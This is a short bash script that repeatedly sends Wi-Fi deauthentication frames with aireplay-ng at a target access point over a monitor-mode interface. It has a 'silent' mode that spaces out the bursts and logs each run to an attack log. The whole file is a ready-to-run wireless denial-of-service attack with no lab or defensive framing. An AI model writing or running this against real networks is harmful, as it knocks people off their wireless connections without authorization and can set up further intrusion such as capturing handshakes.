#!/usr/bin/env bash
set -euo pipefail

TARGET=""
IFACE="wlan0mon"
MODE="silent"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target) TARGET="$2"; shift 2 ;;
    --iface) IFACE="$2"; shift 2 ;;
    --mode) MODE="$2"; shift 2 ;;
    *) echo "Unknown arg $1"; exit 1 ;;
  esac
done

if [[ -z "$TARGET" ]]; then
  echo "Missing --target" >&2
  exit 2
fi

# log to file
echo "$(date --iso-8601=seconds) deauth target=$TARGET iface=$IFACE mode=$MODE" >> "$(dirname "$0")/attack.log"

# Example execution:
if [[ "$MODE" == "silent" ]]; then
  for i in {1..20}; do
    sudo aireplay-ng --deauth 1 -a "${TARGET}" "${IFACE}"
    sleep 2
  done
else
  for i in {1..20}; do
    sudo aireplay-ng --deauth 1 -a "${TARGET}" "${IFACE}"
  done
fi
